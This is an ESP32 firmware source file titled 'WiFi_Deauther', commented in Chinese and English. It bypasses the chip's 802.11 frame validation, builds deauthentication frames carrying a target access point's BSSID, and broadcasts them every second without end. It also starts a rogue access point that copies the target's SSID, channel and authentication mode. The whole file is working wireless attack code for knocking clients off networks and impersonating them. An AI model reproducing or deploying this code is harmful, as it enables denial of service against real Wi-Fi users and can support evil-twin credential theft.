#include <string.h>
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "esp_event.h"
#include "esp_system.h"
#include "esp_log.h"
#include "esp_log_level.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "nvs_flash.h"
#include "driver/gpio.h"
#include "esp_wifi_default.h"
#include "esp_netif_defaults.h"
#include "esp_random.h"
#include "config.h"

#define TAG "WiFi_Deauther" 
// 强制禁用802.11帧校验（允许发送非法帧）
// Force disable 802.11 frame validation (allows sending malformed frames)
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
    return 0;
}

// 定义802.11去认证帧模板
// Define 802.11 deauthentication frame template
static const uint8_t deauth_frame_template[] = {
    // 帧控制字段
    // Frame control field
    0xc0, 0x00, 
    // 持续时间/ID
    // Duration/ID
    0x3a, 0x01,
    // 目标MAC地址（广播地址）
    // Destination MAC (broadcast)
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    // 源BSSID（初始填充0）
    // Source BSSID (initialized to 0)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    // 发送端BSSID（初始填充0）
    // Transmitter BSSID (initialized to 0)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    // 序列控制/原因代码
    // Sequence control/Reason code
    0xf0, 0xff, 0x02, 0x00
};

// 发送原始802.11帧
// Send raw 802.11 frame
// 参数说明
// Parameters:
// - frame_buffer: 帧数据缓冲区
//   Frame data buffer
// - size: 帧数据长度
//   Frame data length
void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size){
    esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
}

// WiFi去认证任务
// WiFi deauthentication task
// 参数说明
// Parameters:
// - pvParameters: 接收wifi_ap_record_t结构体指针
//   Receives wifi_ap_record_t pointer
void wifi_deauth_task(void *pvParameters) {
    wifi_ap_record_t *ap_record = pvParameters;
    // 在栈上创建deauth_frame副本，确保线程安全
    // Create a copy of deauth_frame on the stack for thread safety
    uint8_t deauth_frame[sizeof(deauth_frame_template)];
    memcpy(deauth_frame, deauth_frame_template, sizeof(deauth_frame_template));
    
    // 修改副本中的BSSID字段
    // Modify the BSSID field in the copy
    memcpy(deauth_frame + 10, ap_record->bssid, 6);
    memcpy(deauth_frame + 16, ap_record->bssid, 6);

    ESP_LOGI(TAG,"Built deauth frame");
    
    // 配置AP参数
    // Configure AP parameters
    wifi_config_t wifi_config = {
        .ap = {
            .password = "5b5f0dd368e080baa8d8ce197cff8c03fdaf9a2d4c9a2f647e8b5b015f5b3311",  
            // 示例密码
            // Example password
            .channel = ap_record->primary,        
            // 使用目标AP的信道
            // Use target AP's channel
            .authmode = ap_record->authmode,      
            // 继承目标AP的认证模式
            // Inherit target AP's auth mode
            .ssid_len = strlen(TARGET_SSID),      
            // SSID长度
            // SSID length
            .max_connection = 1,                  
            // 最大连接数
            // Max connections
        },
        .sta = {
            .ssid = TARGET_SSID,  // 目标SSID（来自config.h）| Target SSID (from config.h)
        }
    };
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &wifi_config));
    ESP_LOGI(TAG, "Started AP");
    
    bool stop_task = false;
    while(!stop_task) {
        wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame));
        ESP_LOGI(TAG, "Sent deauth packet");
        vTaskDelay(pdMS_TO_TICKS(1000));  // 1000ms发送间隔 | 1000ms transmission interval
    }
}

// 启动去认证任务
// Start deauthentication task
// 参数说明
// Parameters:
// - ap_info: 包含目标AP信息的结构体指针
//   Pointer to target AP info structure
void start_deauth_task(wifi_ap_record_t *ap_info) {
    wifi_ap_record_t *ap_record = pvPortMalloc(sizeof(wifi_ap_record_t));
    if (ap_record == NULL) {
        ESP_LOGE(TAG, "Memory allocation failed");
        return;
    }
    
    // 传递分配的ap_record给任务
    // Pass the allocated ap_record to the task
    memcpy(ap_record, ap_info, sizeof(wifi_ap_record_t));
    // 创建FreeRTOS任务
    // Create FreeRTOS task
    if (xTaskCreate(&wifi_deauth_task, "wifi_deauth_task", 4096, ap_record, 5, NULL) != pdPASS) {
        ESP_LOGE(TAG, "Task creation failed");
        vPortFree(ap_record);
    }
}